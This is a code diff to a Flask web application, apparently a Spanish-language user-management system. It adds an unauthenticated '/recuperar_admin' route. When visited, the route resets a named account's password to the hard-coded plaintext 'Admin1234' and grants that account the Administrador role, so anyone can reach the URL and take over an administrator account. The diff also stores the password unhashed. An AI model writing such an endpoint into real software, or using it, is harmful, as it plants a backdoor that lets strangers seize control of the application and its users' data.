@@ -274,6 +274,21 @@ def usuarios():
         usuarios=usuarios
     )
 
+@app.route("/recuperar_admin")
+def recuperar_admin():
+
+    usuario = Usuario.query.filter_by(cedula="TAHUM-E11").first()
+
+    if not usuario:
+        return "Usuario TAHUM-E11 no encontrado", 404
+
+    usuario.password = "Admin1234"
+    usuario.rol = "Administrador"
+
+    db.session.commit()
+
+    return "Contraseña del administrador restablecida correctamente."
+
 
 @app.route("/crear_usuario", methods=["POST"])
 def crear_usuario():
